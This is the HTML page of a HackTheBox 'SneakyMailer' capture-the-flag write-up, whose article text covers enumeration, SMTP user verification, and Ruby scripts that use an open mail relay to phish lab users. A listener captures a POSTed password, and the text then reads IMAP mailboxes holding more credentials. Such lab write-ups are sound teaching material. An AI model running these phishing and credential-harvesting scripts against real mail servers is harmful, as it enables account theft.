@@ -1,0 +1,583 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>SneakyMailer | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,medium"><meta name=description content="SneakyMailer HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/sneakymailer/><link crossorigin=anonymous href=/assets/css/stylesheet.c5de734fbd88c3d21543485ffbcb1ccdda89a86a780cf987fa00199c41dbc947.css integrity="sha256-xd5zT72Iw9IVQ0hf+8sczdqJqGp4DPmH+gAZnEHbyUc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/sneakymailer/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="SneakyMailer "><meta property="og:description" content="SneakyMailer HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/sneakymailer/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/sneakymailer/sneakymailer.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-11-28T13:47:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/sneakymailer/sneakymailer.png"><meta name=twitter:title content="SneakyMailer "><meta name=twitter:description content="SneakyMailer HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"SneakyMailer ","item":"https://s4ch.github.io/writeups/hackthebox/sneakymailer/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"SneakyMailer ","name":"SneakyMailer ","description":"SneakyMailer HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","medium"],"articleBody":"Information Name: SneakyMailer Profile: www.hackthebox.eu Difficulty: Medium OS: Linux Points: 30 Overview Install tools used in this WU on BlackArch Linux:\n$ pacman -S nmap ffuf lynx ruby ruby-nokogiri swaks pwncat evolution filezilla Network enumeration Port \u0026 service discovery with nmap:\n# Nmap 7.80 scan initiated Sun Nov 8 16:50:55 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.197 Nmap scan report for 10.10.10.197 Host is up (0.022s latency). Not shown: 65528 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA) | 256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA) |_ 256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 80/tcp open http nginx 1.14.2 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1.14.2 |_http-title: Did not follow redirect to http://sneakycorp.htb 143/tcp open imap Courier Imapd (released 2018) |_imap-capabilities: THREAD=ORDEREDSUBJECT IMAP4rev1 IDLE THREAD=REFERENCES SORT ENABLE ACL2=UNION UIDPLUS STARTTLS completed ACL CHILDREN UTF8=ACCEPTA0001 NAMESPACE OK QUOTA CAPABILITY | ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US | Subject Alternative Name: email:postmaster@example.com | Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US | Public Key type: rsa | Public Key bits: 3072 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-05-14T17:14:21 | Not valid after: 2021-05-14T17:14:21 | MD5: 3faf 4166 f274 83c5 8161 03ed f9c2 0308 |_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c |_ssl-date: TLS randomness does not represent time 993/tcp open ssl/imap Courier Imapd (released 2018) |_imap-capabilities: THREAD=ORDEREDSUBJECT IMAP4rev1 IDLE THREAD=REFERENCES SORT ENABLE ACL2=UNION UIDPLUS completed ACL CHILDREN UTF8=ACCEPTA0001 AUTH=PLAIN NAMESPACE OK QUOTA CAPABILITY | ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US | Subject Alternative Name: email:postmaster@example.com | Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US | Public Key type: rsa | Public Key bits: 3072 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-05-14T17:14:21 | Not valid after: 2021-05-14T17:14:21 | MD5: 3faf 4166 f274 83c5 8161 03ed f9c2 0308 |_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c |_ssl-date: TLS randomness does not represent time 8080/tcp open http nginx 1.14.2 | http-methods: |_ Supported Methods: GET HEAD |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: nginx/1.14.2 |_http-title: Welcome to nginx! Service Info: Host: debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Nov 8 16:51:55 2020 -- 1 IP address (1 host up) scanned in 60.40 seconds We can see there is a redirect from the web server on port 80 to http://sneakycorp.htb, so let’s add this local domain to /etc/hosts:\n$ cat /etc/hosts | grep sneak 10.10.10.197 sneakycorp.htb HTTP enumeration Let’s see if we can find links:\n$ lynx -dump -listonly -nonumbers http://sneakycorp.htb/ Visible links: http://sneakycorp.htb/index.php http://sneakycorp.htb/team.php http://sneakycorp.htb/ http://sneakycorp.htb/ http://sneakycorp.htb/ http://sneakycorp.htb/ http://sneakycorp.htb/ Hidden links: http://sneakycorp.htb/index.php http://sneakycorp.htb/ http://sneakycorp.htb/ http://sneakycorp.htb/ http://sneakycorp.htb/ http://sneakycorp.htb/ http://sneakycorp.htb/ http://sneakycorp.htb/#page-top Nothing useful, maybe the team page if we have a bruteforce to perform later.\nNow we can try to find some sub-domains:\n$ ffuf -u http://sneakycorp.htb/ -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -H 'Host: FUZZ.sneakycorp.htb' -ac /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.2.0-git ________________________________________________ :: Method : GET :: URL : http://sneakycorp.htb/ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Header : Host: FUZZ.sneakycorp.htb :: Follow redirects : false :: Calibration : true :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response size: 185 :: Filter : Response words: 6 :: Filter : Response lines: 8 ________________________________________________ dev [Status: 200, Size: 13737, Words: 4007, Lines: 341] :: Progress: [38267/38267] :: Job [1/1] :: 1807 req/sec :: Duration: [0:00:22] :: Errors: 0 :: We can add dev.sneakycorp.htb to /etc/hosts:\n$ cat /etc/hosts | grep sneak 10.10.10.197 sneakycorp.htb dev.sneakycorp.htb The dev site looks the same but there is an additional page:\n$ lynx -dump -listonly -nonumbers http://dev.sneakycorp.htb/ Visible links: http://dev.sneakycorp.htb/index.php http://dev.sneakycorp.htb/team.php http://dev.sneakycorp.htb/pypi/register.php http://dev.sneakycorp.htb/ http://dev.sneakycorp.htb/ http://dev.sneakycorp.htb/ http://dev.sneakycorp.htb/ http://dev.sneakycorp.htb/ Hidden links: http://dev.sneakycorp.htb/index.php http://dev.sneakycorp.htb/ http://dev.sneakycorp.htb/ http://dev.sneakycorp.htb/ http://dev.sneakycorp.htb/ http://dev.sneakycorp.htb/ http://dev.sneakycorp.htb/ http://dev.sneakycorp.htb/#page-top Let’s try to register an account at http://dev.sneakycorp.htb/pypi/register.php\nWe don’t know if it’s working or if it’s a rabbit hole and there is no login page anyway.\nService discovery The FTP is not accessible anonymously and we don’t have credentials yet.\nThere are a SMTP and IMAP server. This also another web server on port 8080 but found nothing while enumerating.\nSMTP \u0026 IMAP exploitation Let’s connect to the SMTP server and try to verify some email addresses:\n$ ncat sneakycorp.htb 25 220 debian ESMTP Postfix (Debian/GNU) vrfy cyfun@sneakymailer.htb 550 5.1.1 : Recipient address rejected: User unknown in virtual mailbox table vrfy airisatou@sneakymailer.htb 252 2.0.0 airisatou@sneakymailer.htb So it means our account was not created after filling the registration form but emails listed on the team page seem valid.\nI wrote a short ruby script to scrap \u0026 parse the website to extract the email addresses:\n#! /usr/bin/env ruby require 'nokogiri' require 'open-uri' doc = Nokogiri::HTML(URI.open('http://sneakycorp.htb/team.php')) cells = doc.search('table#dataTable tbody tr td') cells.each do |c| puts c.text if /@sneakymailer.htb/.match?(c) end $ ruby grab_email.rb \u003e emails.txt If we want to verify all email addresses, we can re-use a Rubyfu - SMTP Enumeration script and modify it a bit.\n#!/usr/bin/env ruby require 'socket' users = File.read('emails.txt').split(\"\\n\") found = [] @s = TCPSocket.new('sneakycorp.htb', 25) @banner = @s.recv(1024).chomp users.each do |user| @s.send \"VRFY #{user} \\n\\r\", 0 resp = @s.recv(1024).chomp found \u003c\u003c user if resp.split[2] == user end @s.close puts \"[*] Result:-\" puts \"[+] Banner: \" + @banner puts \"[+] Found users: \\n#{found.join(\"\\n\")}\" In theory there is nmap script for that too but it didn’t work in my case:\n$ nmap --script smtp-enum-users.nse --script-args smtp-enum-users.methods={VRFY},userdb=$(pwd)/emails.txt -p 25 sneakycorp.htb We can use another script to very available commands:\n$ nmap --script smtp-commands.nse -pT:25 sneakycorp.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-08 19:03 CET Nmap scan report for sneakycorp.htb (10.10.10.197) Host is up (0.022s latency). PORT STATE SERVICE 25/tcp open smtp |_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, Nmap done: 1 IP address (1 host up) scanned in 10.36 seconds There is another script to check for open relay but it doesn’t work here (maybe because the anti-spam test target nmap.scanme.org by default).\n$ nmap --script smtp-open-relay.nse -p 25 sneakycorp.htb --script-args smtp-open-relay.to=tigernixon@sneakymailer.htb,smtp-open-relay.from=cyfun@sneakymailer.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-08 19:09 CET Nmap scan report for sneakycorp.htb (10.10.10.197) Host is up (0.023s latency). PORT STATE SERVICE 25/tcp open smtp |_smtp-open-relay: Server doesn't seem to be an open relay, all tests failed Nmap done: 1 IP address (1 host up) scanned in 29.45 seconds Before going farther I checked we can’t read emails from the account we registered. The HackTricks - IMAP Syntax was useful for that.\n$ ncat sneakycorp.htb 143 * OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc. See COPYING for distribution information. A1 LOGIN \"cyfun@sneakymailer.htb\" \"password\" A1 NO Login failed. I seems the SMTP server is vulnerable to open relay:\nAn SMTP server that works as an open relay, is a email server that does not verify if the user is authorised to send email from the specified email address. Therefore, users would be able to send email originating from any third-party email address that they want.\n$ ncat sneakycorp.htb 25 MA220 debian ESMTP Postfix (Debian/GNU) MAIL from:cyfun@sneakymailer.htb 250 2.1.0 Ok RCPT to:tigernixon@sneakymailer.htb 250 2.1.5 Ok DATA 354 End data with . hello open relay . 250 2.0.0 Ok: queued as 4773E25011 I wrote a script to abuse of SMTP open relay and send a test email to all users:\n#!/usr/bin/env ruby require 'socket' users = File.read('emails.txt').split(\"\\n\") @s = TCPSocket.new('sneakycorp.htb', 25) @banner = @s.recv(1024).chomp users.each do |user| @s.send \"MAIL from:cyfun@sneakymailer.htb \\n\\r\", 0 @s.send \"RCPT to:#{user} \\n\\r\", 0 @s.send \"DATA \\n\\r\", 0 @s.send \"test \\r\\n.\\r\\n\", 0 resp = @s.recv(1024).chomp puts resp end @s.close puts \"[*] Result:-\" puts \"[+] Banner: \" + @banner Let’s change the email body content, replacing test by phishing content like a link to our web server and hope one of the users will click it.\n#!/usr/bin/env ruby require 'socket' users = File.read('emails.txt').split(\"\\n\") @s = TCPSocket.new('sneakycorp.htb', 25) @banner = @s.recv(1024).chomp users.each do |user| @s.send \"MAIL from:cyfun@sneakymailer.htb \\n\\r\", 0 @s.send \"RCPT to:#{user} \\n\\r\", 0 @s.send \"DATA \\n\\r\", 0 @s.send \"http://10.10.14.142:8080 \\r\\n.\\r\\n\", 0 resp = @s.recv(1024).chomp puts resp end @s.close puts \"[*] Result:-\" puts \"[+] Banner: \" + @banner Nice Paul felt into the trick:\n$ pwncat -l 8080 -vv INFO: Listening on :::8080 (family 10/IPv6, TCP) INFO: Listening on 0.0.0.0:8080 (family 2/IPv4, TCP) INFO: Client connected from 10.10.10.197:52994 (family 2/IPv4, TCP) POST / HTTP/1.1 Host: 10.10.14.142:8080 User-Agent: python-requests/2.23.0 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Length: 185 Content-Type: application/x-www-form-urlencoded firstName=Paul\u0026lastName=Byrd\u0026email=paulbyrd%40sneakymailer.htb\u0026password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt\u0026rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt Let’s URL decode the POST body:\n$ irb irb(main):001:0\u003e require 'cgi' =\u003e true irb(main):002:0\u003e puts CGI.unescape('firstName=Paul\u0026lastName=Byrd\u0026email=paulbyrd%40sneakymailer.htb\u0026password=%5E%28%23J %40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt\u0026rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt') firstName=Paul\u0026lastName=Byrd\u0026email=paulbyrd@sneakymailer.htb\u0026password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl\u003c:Ht\u0026rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl\u003c:Ht =\u003e ni So here are our creds: paulbyrd@sneakymailer.htb / ^(#J@SkFv2[%KhIxKk(Ju`hqcHl\u003c:Ht.\nIt seems that the username is not the full email address:\n$ ncat sneakycorp.htb 143 * OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc. See COPYING for distribution information. A1 LOGIN \"paulbyrd@sneakymailer.htb\" \"^(#J@SkFv2[%KhIxKk(Ju`hqcHl\u003c:Ht\" A1 NO Login failed. ^C $ ncat sneakycorp.htb 143 * OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc. See COPYING for distribution information. A1 LOGIN \"paulbyrd\" \"^(#J@SkFv2[%KhIxKk(Ju`hqcHl\u003c:Ht\" * OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library) A1 OK LOGIN Ok. A1 LIST \"\" * * LIST (\\Unmarked \\HasChildren) \".\" \"INBOX\" * LIST (\\HasNoChildren) \".\" \"INBOX.Trash\" * LIST (\\HasNoChildren) \".\" \"INBOX.Sent\" * LIST (\\HasNoChildren) \".\" \"INBOX.Deleted Items\" * LIST (\\HasNoChildren) \".\" \"INBOX.Queue\" * LIST (\\HasNoChildren) \".\" \"INBOX.Sent Items\" * LIST (\\HasNoChildren) \".\" \"INBOX.Drafts\" A1 OK LIST completed I tried to connect to the IMAP server with Thunderbird and Kube but it wasn’t working but when I tried with Evolution it worked.\nBut it’s possible to continue via raw IMAP:\nA1 LIST \"INBOX.Sent Items\" * A1 OK LIST completed A1 SELECT \"INBOX.Sent Items\" * FLAGS (\\Draft \\Answered \\Flagged \\Deleted \\Seen \\Recent) * OK [PERMANENTFLAGS (\\* \\Draft \\Answered \\Flagged \\Deleted \\Seen)] Limited * 2 EXISTS * 0 RECENT * OK [UIDVALIDITY 589480766] Ok * OK [MYRIGHTS \"acdilrsw\"] ACL A1 OK [READ-WRITE] Ok A1 FETCH 2 all * 2 FETCH (FLAGS (\\Seen) INTERNALDATE \"23-Jun-2020 09:27:08 -0400\" RFC822.SIZE 585 ENVELOPE (\"Wed, 27 May 2020 13:28:58 -0400\" \"Module testing\" ((\"Paul Byrd\" NIL \"paulbyrd\" \"sneakymailer.htb\")) ((\"Paul Byrd\" NIL \"paulbyrd\" \"sneakymailer.htb\")) ((\"Paul Byrd\" NIL \"paulbyrd\" \"sneakymailer.htb\")) ((NIL NIL \"low\" \"debian\")) NIL NIL NIL \"\u003c4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb\u003e\")) A1 OK FETCH completed. A1 FETCH 1 all * 1 FETCH (FLAGS (\\Seen) INTERNALDATE \"27-May-2020 13:43:07 -0400\" RFC822.SIZE 2167 ENVELOPE (\"Fri, 15 May 2020 13:03:37 -0500\" \"Password reset\" ((\"Paul Byrd\" NIL \"paulbyrd\" \"sneakymailer.htb\")) ((\"Paul Byrd\" NIL \"paulbyrd\" \"sneakymailer.htb\")) ((\"Paul Byrd\" NIL \"paulbyrd\" \"sneakymailer.htb\")) ((\"root\" NIL \"root\" \"debian\")) NIL NIL NIL NIL)) A1 OK FETCH completed. A1 FETCH 2 body[text] * 2 FETCH (BODY[TEXT] {166} Hello low Your current task is to install, test and then erase every python module you find in our PyPI service, let me know if you have any inconvenience. ) A1 OK FETCH completed. A1 FETCH 1 body[text] * 1 FETCH (BODY[TEXT] {1888} --_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_ Content-Transfer-Encoding: quoted-printable Content-Type: text/plain; charset=\"utf-8\" Hello administrator, I want to change this password for the developer accou= nt Username: developer Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C Please notify me when you do it=20 --_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_ Content-Transfer-Encoding: quoted-printable Content-Type: text/html; charset=\"utf-8\" ","wordCount":"3167","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/sneakymailer/sneakymailer.png","datePublished":"2020-11-28T13:47:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/sneakymailer/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/archives title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">SneakyMailer</h1><div class=post-description>SneakyMailer HackTheBox writeup</div><div class=post-meta><span title='2020-11-28 13:47:00 +0000 UTC'>November 28, 2020</span>&nbsp;·&nbsp;15 min&nbsp;·&nbsp;3167 words&nbsp;·&nbsp;s4ch</div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/sneakymailer/sneakymailer.png alt="SneakyMailer HackTheBox Machine"><p>SneakyMailer - Medium Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#http-enumeration>HTTP enumeration</a></li><li><a href=#service-discovery>Service discovery</a></li><li><a href=#smtp--imap-exploitation>SMTP & IMAP exploitation</a></li><li><a href=#ftp-access>FTP access</a></li><li><a href=#privilege-escalation-of-machine--from-www-data-to-developer>Privilege Escalation of Machine : from www-data to developer</a></li><li><a href=#privilege-escalation-of-machine--from-developer-to-low>Privilege Escalation of Machine : from developer to low</a></li><li><a href=#privilege-escalation-of-machine--from-low-to-root>Privilege Escalation of Machine : from low to root</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> SneakyMailer</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/262>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 30</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><pre tabindex=0><code>$ pacman -S nmap ffuf lynx ruby ruby-nokogiri swaks pwncat evolution filezilla
+</code></pre><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port & service discovery with <a href=https://nmap.org/>nmap</a>:</p><pre tabindex=0><code># Nmap 7.80 scan initiated Sun Nov  8 16:50:55 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.197
+Nmap scan report for 10.10.10.197
+Host is up (0.022s latency).
+Not shown: 65528 closed ports
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      vsftpd 3.0.3
+22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
+|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
+|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
+25/tcp   open  smtp     Postfix smtpd
+|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
+80/tcp   open  http     nginx 1.14.2
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.14.2
+|_http-title: Did not follow redirect to http://sneakycorp.htb
+143/tcp  open  imap     Courier Imapd (released 2018)
+|_imap-capabilities: THREAD=ORDEREDSUBJECT IMAP4rev1 IDLE THREAD=REFERENCES SORT ENABLE ACL2=UNION UIDPLUS STARTTLS completed ACL CHILDREN UTF8=ACCEPTA0001 NAMESPACE OK QUOTA CAPABILITY
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Subject Alternative Name: email:postmaster@example.com
+| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Public Key type: rsa
+| Public Key bits: 3072
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-05-14T17:14:21
+| Not valid after:  2021-05-14T17:14:21
+| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
+|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c
+|_ssl-date: TLS randomness does not represent time
+993/tcp  open  ssl/imap Courier Imapd (released 2018)
+|_imap-capabilities: THREAD=ORDEREDSUBJECT IMAP4rev1 IDLE THREAD=REFERENCES SORT ENABLE ACL2=UNION UIDPLUS completed ACL CHILDREN UTF8=ACCEPTA0001 AUTH=PLAIN NAMESPACE OK QUOTA CAPABILITY
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Subject Alternative Name: email:postmaster@example.com
+| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Public Key type: rsa
+| Public Key bits: 3072
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-05-14T17:14:21
+| Not valid after:  2021-05-14T17:14:21
+| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
+|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c
+|_ssl-date: TLS randomness does not represent time
+8080/tcp open  http     nginx 1.14.2
+| http-methods:
+|_  Supported Methods: GET HEAD
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: nginx/1.14.2
+|_http-title: Welcome to nginx!
+Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Nov  8 16:51:55 2020 -- 1 IP address (1 host up) scanned in 60.40 seconds
+</code></pre><p>We can see there is a redirect from the web server on port 80 to <a href=http://sneakycorp.htb>http://sneakycorp.htb</a>,
+so let&rsquo;s add this local domain to <code>/etc/hosts</code>:</p><pre tabindex=0><code>$ cat /etc/hosts | grep sneak
+10.10.10.197 sneakycorp.htb
+</code></pre><h2 id=http-enumeration>HTTP enumeration<a hidden class=anchor aria-hidden=true href=#http-enumeration>#</a></h2><p>Let&rsquo;s see if we can find links:</p><pre tabindex=0><code>$ lynx -dump -listonly -nonumbers http://sneakycorp.htb/
+   Visible links:
+http://sneakycorp.htb/index.php
+http://sneakycorp.htb/team.php
+http://sneakycorp.htb/
+http://sneakycorp.htb/
+http://sneakycorp.htb/
+http://sneakycorp.htb/
+http://sneakycorp.htb/
+
+   Hidden links:
+http://sneakycorp.htb/index.php
+http://sneakycorp.htb/
+http://sneakycorp.htb/
+http://sneakycorp.htb/
+http://sneakycorp.htb/
+http://sneakycorp.htb/
+http://sneakycorp.htb/
+http://sneakycorp.htb/#page-top
